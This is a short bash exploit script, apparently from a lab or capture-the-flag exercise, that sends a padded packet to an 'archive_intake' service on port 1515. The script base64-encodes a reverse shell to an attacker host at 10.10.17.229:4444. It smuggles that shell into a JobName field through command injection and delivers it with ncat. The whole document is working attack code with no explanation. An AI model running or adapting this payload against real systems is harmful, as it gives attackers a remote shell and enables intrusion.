string="\x02archive_intake"
num=${#string}
echo $num
padding=$((1024-num+2))
echo "padding $padding"

for (( c=0; c<=$padding; c++ ))
do
    string="${string} "
done 
rshell=$(echo 'bash -i >& /dev/tcp/10.10.17.229/4444 0>&1' | base64 -w 0)
echo $rshell

JobName="J';echo $rshell | base64 -d | bash;echo '1"
len=${#JobName}
echo $len
# padding two char
padding=$((1024-2))
string="${string}\x02${len}"
for (( c=0; c<=$padding; c++ ))
do
    string="${string} "
done
string="${string}$JobName"
echo -e "${string}" | ncat -vvvv 10.129.35.158 1515
#echo -e "${string}" | ncat 127.0.0.1 1515